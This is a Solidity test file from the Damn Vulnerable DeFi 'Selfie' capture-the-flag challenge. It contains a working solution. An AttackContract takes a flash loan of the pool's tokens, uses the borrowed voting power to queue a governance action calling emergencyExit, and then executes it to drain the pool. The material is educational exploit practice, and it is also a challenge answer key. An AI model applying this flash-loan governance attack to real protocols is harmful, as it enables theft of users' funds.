// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        AttackContract attack = new AttackContract(
            address(pool),
            recovery,
            address(governance),
            address(token)
        );
        // 1. Start the trigger
        attack.startTrigger();

        // 4. simulates 2 days after
        vm.warp(block.timestamp + 2 days);

        // 5. Starts execute the malicious vote we put earlier
        attack.executeAction();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}

contract AttackContract is IERC3156FlashBorrower {
    // setup the env, all follow the original struct
    SelfiePool pool;
    SimpleGovernance governance;
    address recovery;
    DamnValuableVotes DVT_token;

    uint256 actionID;

    constructor(
        address _pool,
        address _recovery,
        address _governance,
        address _token
    ) {
        pool = SelfiePool(_pool);
        recovery = _recovery;
        governance = SimpleGovernance(_governance);
        DVT_token = DamnValuableVotes(_token);
    }

    // 2. Start the flashLoan, and get the funds to this contract
    function startTrigger() external {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(DVT_token),
            1_500_000e18,
            ""
        );
    }

    // 3. ERC3156FlashBorrower's onFlashLoan callback function
    // After flashLoan executes, it calls the `onFlashLoan` function from the borrower

    // Here we starts our malicious votes
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Make sure this contract can vote
        DVT_token.delegate(address(this));

        // Construct the malicious vote data
        bytes memory maliciousVotesData = abi.encodeWithSignature(
            "emergencyExit(address)",
            recovery
        );

        // Now we have the flashloan DVT token, we can start the queueAction()
        // Here we vote the Selfie Pool to execute the following data
        // abi.encodeWithSignature("emergencyExit(address)", recovery)

        // This maliciousVotesData will gets execute at the source code
        // actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
        actionID = governance.queueAction(address(pool), 0, maliciousVotesData);

        // Make sure we are able to refund the flashloan (pool in this case)
        IERC20(DVT_token).approve(address(pool), amount + fee);

        // Return SUCCESS as protocol defined
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // 6. Simply call the executeAction()
    function executeAction() external {
        bytes memory results = governance.executeAction(actionID);
    }
}
